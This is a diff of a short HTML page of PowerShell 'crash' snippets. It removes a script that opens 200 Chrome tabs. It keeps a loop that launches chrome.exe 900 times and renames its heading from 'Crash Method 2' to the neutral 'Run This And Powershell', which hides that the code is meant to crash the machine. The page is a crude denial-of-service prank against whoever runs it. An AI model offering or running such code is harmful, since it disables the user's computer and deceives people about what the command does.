@@ -1,13 +1,5 @@
-<h1>CRASH COMPUTER (Powershell)</h1>
-<p>$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
-$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
-$urls = 1..200 | ForEach-Object { "https://www.google.com/search?q=tab$_" }
 
-foreach ($url in $urls) {
-    Start-Process $chromePath -ArgumentList "--new-tab", $url
-}
-</p>
-<h1>Crash Method 2 (Powershell)</h1>
+<h1>Run This And Powershell</h1>
 <p>for ($i = 1; $i -le 900; $i++) {
     Start-Process "chrome.exe"
 }
